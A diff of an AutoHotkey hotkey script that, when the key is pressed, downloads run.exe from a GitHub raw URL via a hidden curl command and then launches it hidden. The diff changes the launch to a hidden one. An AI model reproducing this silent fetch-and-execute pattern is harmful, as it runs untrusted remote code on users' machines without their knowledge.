@@ -12,11 +12,11 @@ $j::{
         return
     }
 
+    output := path "\run.exe"
     if (DirExist(path)) {
         if (FileExist(path "\run.exe")) {
-            Run "run.exe"
+            Run output, , "Hide"
         } else {
-            output := path "\run.exe"
             url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
             command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
             RunWait command, , "Hide"
@@ -24,7 +24,6 @@ $j::{
         }
     } else {
         DirCreate(path)
-        output := path "\run.exe"
         url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
         RunWait command, , "Hide"
